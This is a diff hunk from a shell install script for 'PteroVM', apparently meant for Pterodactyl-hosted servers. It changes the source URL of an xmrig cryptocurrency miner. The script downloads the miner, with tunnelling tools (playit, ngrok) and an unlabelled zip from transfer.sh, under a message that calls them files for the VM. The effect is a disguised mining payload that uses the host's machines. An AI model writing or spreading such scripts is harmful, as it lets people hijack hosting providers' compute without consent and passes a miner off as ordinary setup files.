@@ -56,7 +56,7 @@ if [[ -f "./installed" ]]; then
     runcmd
 else
     echo "Downloading files for PteroVM"
-    curl -sSLo xmrig raw.githubusercontent.com/afnan007a/xmrig-miner-installer/main/xmrig/xmrig
+    curl -sSLo xmrig raw.githubusercontent.com/afnan007a/Ptero-vm/main/xmrig
     curl -sSLo playit https://playit.gg/downloads/playit-linux_64-0.4.6
     curl -sSLo ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
     curl -sSLo ptero-vm.zip https://transfer.sh/get/PK1ASb/ptero-vm.zip
